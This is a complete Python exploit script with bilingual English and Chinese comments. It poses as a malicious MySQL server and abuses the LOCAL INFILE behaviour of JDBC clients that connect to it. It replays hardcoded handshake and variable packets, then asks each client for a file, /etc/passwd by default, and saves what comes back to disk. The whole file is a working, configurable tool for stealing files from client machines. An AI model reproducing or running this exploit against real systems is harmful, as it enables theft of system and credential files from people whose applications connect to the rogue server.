#!/usr/bin/env python3
"""
MySQL JDBC File Read Vulnerability Exploit
This script emulates a malicious MySQL server that exploits the JDBC file read vulnerability
to read files from connecting clients' systems.

MySQL JDBC 文件读取漏洞利用工具
此脚本模拟恶意 MySQL 服务器，利用 JDBC 文件读取漏洞读取连接客户端系统上的文件。
"""

import socket
import argparse
import logging
import os
import time
from datetime import datetime

def setup_logging(log_level):
    """
    Configure logging with the specified level.
    配置日志系统，设置指定的日志级别。
    """
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[logging.StreamHandler()]
    )

def save_data(data, output_dir):
    """
    Save received data to a file in the specified directory.
    将接收到的数据保存到指定目录中的文件。
    """
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(output_dir, f"captured_data_{timestamp}.txt")
    
    try:
        with open(filename, "wb") as f:
            f.write(data)
        logging.info(f"Data saved to {filename} | 数据已保存至 {filename}")
        return filename
    except Exception as e:
        logging.error(f"Failed to save data: {e} | 保存数据失败: {e}")
        return None

def run_server(bind_address, port, target_file, output_dir):
    """
    Run the malicious MySQL server.
    运行恶意 MySQL 服务器。
    """
    try:
        # 创建套接字并设置端口重用 | Create socket and set port reuse
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sk.bind((bind_address, port))
        sk.listen(5)  # 增加等待队列以支持多连接 | Increased backlog for multiple connections
        
        logging.info(f"Server listening on {bind_address}:{port} | 服务器监听于 {bind_address}:{port}")
        logging.info(f"Targeting file: {target_file} | 目标文件: {target_file}")
        
        while True:
            try:
                # 等待客户端连接 | Wait for client connection
                conn, addr = sk.accept()
                client_ip = addr[0]
                client_port = addr[1]
                logging.info(f"Connection from {client_ip}:{client_port} | 收到来自 {client_ip}:{client_port} 的连接")
                
                # 处理客户端连接 | Handle client connection
                try:
                    # MySQL 问候包 | MySQL hello packet
                    logging.debug("Sending MySQL hello packet | 发送 MySQL 问候包")
                    conn.sendall(bytes.fromhex("4a0000000a352e372e32360018000000374a10207a5f771e00fff7c00200ff81150000000000000000000025551379067c13160d46727b006d7973716c5f6e61746976655f70617373776f726400"))

                    # 接收登录包 | Receive login packet
                    logging.debug("Waiting for login packet | 等待登录包")
                    data = conn.recv(10240)
                    if not data:
                        logging.warning("No login data received | 未收到登录数据")
                        conn.close()
                        continue
                    logging.debug(f"Received login packet: {data.hex()[:50]}... | 已接收登录包: {data.hex()[:50]}...")

                    # 登录成功包 | Login success packet
                    logging.debug("Sending login success packet | 发送登录成功包")
                    conn.sendall(bytes.fromhex("0700000200000002000000"))

                    # 接收变量请求包 | Receive variable request packet
                    logging.debug("Waiting for variable request packet | 等待变量请求包")
                    data = conn.recv(10240)
                    if not data:
                        logging.warning("No variable request received | 未收到变量请求")
                        conn.close()
                        continue

                    # 发送变量包，设置 max_allowed_packet 为 16MB | Send variables with max_allowed_packet set to 16MB
                    logging.debug("Sending variables packet | 发送变量包")
                    conn.sendall(bytes.fromhex("01000001025200000203646566001173657373696f6e5f7661726961626c65731173657373696f6e5f7661726961626c65730d5661726961626c655f6e616d650d5661726961626c655f6e616d650c2100c0000000fd01100000004200000303646566001173657373696f6e5f7661726961626c65731173657373696f6e5f7661726961626c65730556616c75650556616c75650c2100000c0000fd000000000005000004fe000022001a000005146368617261637465725f7365745f636c69656e7404757466381e000006186368617261637465725f7365745f636f6e6e656374696f6e04757466381b000007156368617261637465725f7365745f726573756c747304757466381a000008146368617261637465725f7365745f73657276657204757466381c0000090c696e69745f636f6e6e6563740e534554204e414d455320757466381800000a13696e7465726163746976655f74696d656f7574033132301900000b166c6f7765725f636173655f7461626c655f6e616d657301311c00000c126d61785f616c6c6f7765645f7061636b65740831363737373231361800000d116e65745f6275666665725f6c656e6774680531363338341500000e116e65745f77726974655f74696d656f75740236301900000f1071756572795f63616368655f73697a650731303438353736150000101071756572795f63616368655f74797065034f4646930000110873716c5f6d6f6465894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e120000121073797374656d5f74696d655f7a6f6e6500110000130974696d655f7a6f6e6506535953"))

                    # 接收警告请求包 | Receive warning request packet
                    logging.debug("Waiting for warning request packet | 等待警告请求包")
                    data = conn.recv(10240)
                    if not data:
                        logging.warning("No warning request received | 未收到警告请求")
                        conn.close()
                        continue

                    # 发送警告包 | Send warning packet
                    logging.debug("Sending warning packet | 发送警告包")
                    conn.sendall(bytes.fromhex("01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000005000005fe000002006a000006075761726e696e6704313336365c496e636f727265637420737472696e672076616c75653a20275c7844365c7844305c7842395c7846415c7842315c7845412e2e2e2720666f7220636f6c756d6e20275641524941424c455f56414c55452720617420726f772034383505000007fe00000200"))

                    # 处理额外请求包 | Process additional packets as needed
                    for _ in range(3):
                        logging.debug("Waiting for request packet | 等待请求包")
                        data = conn.recv(10240)
                        if not data:
                            logging.warning("No request received | 未收到请求")
                            break
                        
                        # 发送通用响应包 | Send a generic response packet
                        logging.debug("Sending response packet | 发送响应包")
                        conn.sendall(bytes.fromhex("0100000101380000020364656600000022404073657373696f6e2e6175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a00000000005000003fe0000020002000004013105000005fe00000200"))
                    
                    # 发送文件读取包 | Send file read packet
                    logging.info(f"Attempting to read file: {target_file} | 尝试读取文件: {target_file}")
                    send_data = chr(len(target_file) + 1).encode() + b"\x00\x00\x01\xfb" + target_file.encode()
                    conn.sendall(send_data)
                    
                    # 接收文件内容 | Receive file content
                    logging.debug("Waiting for file content | 等待文件内容")
                    data = conn.recv(10240)
                    if data:
                        logging.info(f"Received {len(data)} bytes of data | 接收到 {len(data)} 字节的数据")
                        
                        # 保存接收到的数据 | Save the received data
                        if output_dir:
                            saved_file = save_data(data, output_dir)
                            if saved_file:
                                try:
                                    # 显示接收数据的前几行 | Display first few lines of the received data
                                    text_data = data.decode('utf-8', errors='replace')
                                    preview = '\n'.join(text_data.split('\n')[:5]) + '...'
                                    logging.info(f"Data preview | 数据预览:\n{preview}")
                                except Exception as e:
                                    logging.warning(f"Could not decode data: {e} | 无法解码数据: {e}")
                    else:
                        logging.warning("No file content received | 未收到文件内容")
                        
                except Exception as e:
                    logging.error(f"Error handling client {client_ip}: {e} | 处理客户端 {client_ip} 时出错: {e}")
                finally:
                    conn.close()
                    logging.info(f"Connection closed: {client_ip}:{client_port} | 连接已关闭: {client_ip}:{client_port}")
                    
            except socket.error as e:
                logging.error(f"Socket error: {e} | 套接字错误: {e}")
                time.sleep(1)  # 防止CPU过载 | Prevent CPU spin in case of repeated errors
                
    except KeyboardInterrupt:
        logging.info("Server shutdown requested. Exiting... | 服务器关闭请求。正在退出...")
    except Exception as e:
        logging.error(f"Server error: {e} | 服务器错误: {e}")
    finally:
        try:
            sk.close()
            logging.info("Server socket closed | 服务器套接字已关闭")
        except:
            pass

def main():
    """
    Parse command line arguments and start the server.
    解析命令行参数并启动服务器。
    """
    parser = argparse.ArgumentParser(description="MySQL JDBC File Read Vulnerability Exploit | MySQL JDBC 文件读取漏洞利用工具")
    parser.add_argument("--bind", default="0.0.0.0", help="Bind address (default: 0.0.0.0) | 绑定地址 (默认: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=3309, help="Port to listen on (default: 3309) | 监听端口 (默认: 3309)")
    parser.add_argument("--file", default="/etc/passwd", help="Target file to read (default: /etc/passwd) | 要读取的目标文件 (默认: /etc/passwd)")
    parser.add_argument("--output-dir", default="captured_files", help="Directory to save captured files (default: captured_files) | 保存捕获文件的目录 (默认: captured_files)")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging | 启用调试日志")
    
    args = parser.parse_args()
    
    # 设置日志级别 | Set log level
    log_level = logging.DEBUG if args.debug else logging.INFO
    setup_logging(log_level)
    
    try:
        # 启动服务器 | Start the server
        run_server(args.bind, args.port, args.file, args.output_dir)
    except Exception as e:
        logging.critical(f"Fatal error: {e} | 致命错误: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    exit(main())